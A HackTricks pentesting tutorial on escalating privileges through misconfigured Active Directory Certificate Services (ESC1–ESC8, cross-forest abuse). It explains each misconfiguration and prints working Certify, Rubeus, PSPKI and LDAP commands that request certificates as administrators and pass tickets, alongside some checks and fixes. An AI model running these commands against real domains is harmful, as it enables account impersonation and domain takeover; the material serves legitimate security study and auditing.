# Domain Escalation

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>

## Misconfigured Certificate Templates - ESC1

* The **Enterprise CA** grants **low-privileged users enrolment rights**
* **Manager approval is disabled**
* **No authorized signatures are required**
* An overly permissive **certificate template** security descriptor **grants certificate enrolment rights to low-privileged users**
* The **certificate template defines EKUs that enable authentication**:&#x20;
  * _Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA)._
* The **certificate template allows requesters to specify a subjectAltName in the CSR:**
  * **AD** will **use** the identity specified by a certificate’s **subjectAltName** (SAN) field **if** it is **present**. Consequently, if a requester can specify the SAN in a CSR, the requester can **request a certificate as anyone** (e.g., a domain admin user). The certificate template’s AD object **specifies** if the requester **can specify the SAN** in its **`mspki-certificate-name-`**`flag` property. The `mspki-certificate-name-flag` property is a **bitmask** and if the **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** flag is **present**, a **requester can specify the SAN.**

{% hint style="danger" %}
These settings allow a **low-privileged user to request a certificate with an arbitrary SAN**, allowing the low-privileged user to authenticate as any principal in the domain via Kerberos or SChannel.
{% endhint %}

This is often enabled, for example, to allow products or deployment services to generate HTTPS certificates or host certificates on the fly. Or because of lack of knowledge.

Note that when a certificate with this last option is created a **warning appears**, but it doesn't appear if a **certificate template** with this configuration is **duplicated** (like the `WebServer` template which has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled and then the admin might add an authentication OID).

To **find vulnerable certificate templates** you can run:

```bash
Certify.exe find /vulnerable
```

To **abuse this vulnerability to impersonate an administrator** one could run:

```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
```

Then you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus**:

```
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
```

Moreover, the following LDAP query when run against the AD Forest’s configuration schema can be used to **enumerate** **certificate templates** that do **not require approval/signatures**, that have a **Client Authentication or Smart Card Logon EKU**, and have the **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** flag enabled:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Misconfigured Certificate Templates - ESC2

The second abuse scenario is a variation of the first one:

1. The Enterprise CA grants low-privileged users enrollment rights.
2. Manager approval is disabled.
3. No authorized signatures are required.
4. An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
5. **The certificate template defines the Any Purpose EKU or no EKU.**

The **Any Purpose EKU** allows an attacker to get a **certificate** for **any purpose** like client authentication, server authentication, code signing, etc.

A **certificate with no EKUs** — a subordinate CA certificate —  can be abused for **any purpose** as well but could **also use it to sign new certificates**. As such, using a subordinate CA certificate, an attacker could **specify arbitrary EKUs or fields in the new certificates.**

However, if the **subordinate CA is not trusted** by the **`NTAuthCertificates`** object (which it won’t be by default), the attacker **cannot create new certificates** that will work for **domain authentication**. Still, the attacker can create **new certificates with any EKU** and arbitrary certificate values, of which there’s **plenty** the attacker could potentially **abuse** (e.g., code signing, server authentication, etc.) and might have large implications for other applications in the network like SAML, AD FS, or IPSec.

The following LDAP query when run against the AD Forest’s configuration schema can be used to enumerate templates matching this scenario:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Misconfigured Enrolment Agent Templates - ESC3

This scenario is like the first and second one but **abusing** a **different EKU** (Certificate Request Agent) and **2 different templates** (therefore it has 2 sets of requirements),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.

The **“enrollment agent”** enrolls in such a **template** and uses the resulting **certificate to co-sign a CSR on behalf of the other user**. It then **sends** the **co-signed CSR** to the CA, enrolling in a **template** that **permits “enroll on behalf of”**, and the CA responds with a **certificate belong to the “other” user**.

**Requirements 1:**

1. The Enterprise CA allows low-privileged users enrollment rights.
2. Manager approval is disabled.
3. No authorized signatures are required.
4. An overly permissive certificate template security descriptor allows certificate enrollment rights to low-privileged users.
5. The **certificate template defines the Certificate Request Agent EKU**. The Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) allows for requesting other certificate templates on behalf of other principals.

**Requirements 2:**

1. The Enterprise CA allows low-privileged users enrollment rights.
2. Manager approval is disabled.
3. **The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement requiring the Certificate Request Agent EKU.**
4. The certificate template defines an EKU that allows for domain authentication.
5. Enrollment agent restrictions are not implemented on the CA.

You can use [**Certify**](https://github.com/GhostPack/Certify) to abuse this scenario:

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf

# Use Rubeus with the certificate to authenticate as the other user
Certify.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Enterprise CAs can **constrain** the **users** who can **obtain** an **enrollment agent certificate**, the templates enrollment **agents can enroll in**, and which **accounts** the enrollment agent can **act on behalf of** by opening `certsrc.msc` `snap-in -> right clicking on the CA -> clicking Properties -> navigating` to the “Enrollment Agents” tab.

However, the **default** CA setting is “**Do not restrict enrollment agents”.** Even when administrators enable “Restrict enrollment agents”, the default setting is extremely permissive, allowing Everyone access enroll in all templates as anyone.

## Vulnerable Certificate Template Access Control - ESC4

**Certificate templates** have a **security descriptor** that specifies which AD **principals** have specific **permissions over the template**.

If an **attacker** has enough **permissions** to **modify** a **template** and **create** any of the exploitable **misconfigurations** from the **previous sections**, he will be able to exploit it and **escalate privileges**.

Interesting rights over certificate templates:

* **Owner:** Implicit full control of the object, can edit any properties.
* **FullControl:** Full control of the object, can edit any properties.
* **WriteOwner:** Can modify the owner to an attacker-controlled principal.
* **WriteDacl**: Can modify access control to grant an attacker FullControl.
* **WriteProperty:** Can edit any properties

## Vulnerable PKI Object Access Control - ESC5

The web of interconnected ACL based relationships that can affect the security of AD CS is extensive. Several **objects outside of certificate** templates and the certificate authority itself can have a **security impact on the entire AD CS system**. These possibilities include (but are not limited to):

* The **CA server’s AD computer object** (i.e., compromise through S4U2Self or S4U2Proxy)
* The **CA server’s RPC/DCOM server**
* Any **descendant AD object or container in the container** `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services Container, etc.)

If a low-privileged attacker can gain **control over any of these**, the attack can likely **compromise the PKI system**.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

There is another similar issue, described in the [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage), which involves the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag. As Microsoft describes, “**If** this flag is **set** on the CA, **any request** (including when the subject is built from Active Directory®) can have **user defined values** in the **subject alternative name**.”\
This means that an **attacker** can enroll in **ANY template** configured for domain **authentication** that also **allows unprivileged** users to enroll (e.g., the default User template) and **obtain a certificate** that allows us to **authenticate** as a domain admin (or **any other active user/machine**).

**Note**: the **alternative names** here are **included** in a CSR via the `-attrib "SAN:"` argument to `certreq.exe` (i.e., “Name Value Pairs”). This is **different** than the method for **abusing SANs** in ESC1 as it **stores account information in a certificate attribute vs a certificate extension**.

Organizations can **check if the setting is enabled** using the following `certutil.exe` command:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Underneath, this just uses **remote** **registry**, so the following command may work as well:

```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags 
```

****[**Certify**](https://github.com/GhostPack/Certify) also checks for this and can be used to abuse this misconfiguration:

```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
```

These settings can be **set**, assuming **domain administrative** (or equivalent) rights, from any system:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

If you find this setting in your environment, you can **remove this flag** with:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

## Vulnerable Certificate Authority Access Control - ESC7

A certificate authority itself has a **set of permissions** that secure various **CA actions**. These permissions can be access from `certsrv.msc`, right clicking a CA, selecting properties, and switching to the Security tab:

<figure><img src="../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

This can also be enumerated via [**PSPKI’s module**](https://www.pkisolutions.com/tools/pspki/) with `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:

```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```

The two main rights here are the **`ManageCA`** right and the **`ManageCertificates`** right, which translate to the “CA administrator” and “Certificate Manager”.

If you have a principal with **`ManageCA`** rights on a **certificate authority**, we can use **PSPKI** to remotely flip the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bit to **allow SAN** specification in any template ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

This is also possible in a simpler form with [**PSPKI’s Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) cmdlet.

The **`ManageCertificates`** rights permits to **approve a pending request**, therefore bypassing the "CA certificate manager approval" protection.

You can use a **combination** of **Certify** and **PSPKI** module to request a certificate, approve it, and download it:

```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```

## NTLM Relay to AD CS HTTP Endpoints – ESC8

{% hint style="info" %}
In summary, if an environment has **AD CS installed**, along with a **vulnerable web enrollment endpoint** and at least one **certificate template published** that allows for **domain computer enrollment and client authentication** (like the default **`Machine`** template), then an **attacker can compromise ANY computer with the spooler service running**!
{% endhint %}

AD CS supports several **HTTP-based enrollment methods** via additional AD CS server roles that administrators can install. These HTTPbased certificate enrollment interfaces are all **vulnerable NTLM relay attacks**. Using NTLM relay, an attacker on a **compromised machine can impersonate any inbound-NTLM-authenticating AD account**. While impersonating the victim account, an attacker could access these web interfaces and **request a client authentication certificate based on the `User` or `Machine` certificate templates**.

* The **web enrollment interface** (an older looking ASP application accessible at `http://<caserver>/certsrv/`), by default only supports HTTP, which cannot protect against NTLM relay attacks. In addition, it explicitly only allows NTLM authentication via its Authorization HTTP header, so more secure protocols like Kerberos are unusable.
* The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) support negotiate authentication by default via their Authorization HTTP header. Negotiate authentication **support** Kerberos and **NTLM**; consequently, an attacker can **negotiate down to NTLM** authentication during relay attacks. These web services do at least enable HTTPS by default, but unfortunately HTTPS by itself does **not protect against NTLM relay attacks**. Only when HTTPS is coupled with channel binding can HTTPS services be protected from NTLM relay attacks. Unfortunately, AD CS does not enable Extended Protection for Authentication on IIS, which is necessary to enable channel binding.

Common **problems** with NTLM relay attacks are that the **NTLM sessions are usually short** and that the attacker **cannot** interact with services that **enforce NTLM signing**.

However, abusing a NTLM relay attack to obtain a certificate to the user solves this limitations, as the session will live as long as the certificate is valid and the certificate can be used to use services **enforcing NTLM signing**. To know how to use an stolen cert check:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Another limitation of NTLM relay attacks is that they **require a victim account to authenticate to an attacker-controlled machine**. An attacker could wait or could try to **force** it:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

****[**Certify**](https://github.com/GhostPack/Certify)’s `cas` command can enumerate **enabled HTTP AD CS endpoints**:

```
Certify.exe cas
```

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Enterprise CAs also **store CES endpoints** in their AD object in the `msPKI-Enrollment-Servers` property. **Certutil.exe** and **PSPKI** can parse and list these endpoints:

```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Compromising Forests with Certificates

### CAs Trusts Breaking Forest Trusts

The setup for **cross-forest enrollment** is relatively simple. Administrators publish the **root CA certificate** from the resource forest **to the account forests** and add the **enterprise CA** certificates from the resource forest to the **`NTAuthCertificates`** and AIA containers **in each account forest**. To be clear, this means that the **CA** in the resource forest has **complete control** over all **other forests it manages PKI for**. If attackers **compromise this CA**, they can **forge certificates for all users in the resource and account forests**, breaking the forest security boundary.

### Foreign Principals With Enrollment Privileges

Another thing organizations need to be careful of in multi-forest environments is Enterprise CAs **publishing certificates templates** that grant **Authenticated Users or foreign principals** (users/groups external to the forest the Enterprise CA belongs to) **enrollment and edit rights**.\
When an account **authenticates across a trust**, AD adds the **Authenticated Users SID** to the authenticating user’s token. Therefore, if a domain has an Enterprise CA with a template that **grants Authenticated Users enrollment rights**, a user in different forest could potentially **enroll in the template**. Similarly, if a template explicitly grants a **foreign principal enrollment rights**, then a **cross-forest access-control relationship gets created**, permitting a principal in one forest to **enroll in a template in another forest**.

Ultimately both these scenarios **increase the attack surface** from one forest to another. Depending on the certificate template settings, an attacker could abuse this to gain additional privileges in a foreign domain.

## References

* All the information for this page was taken from [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>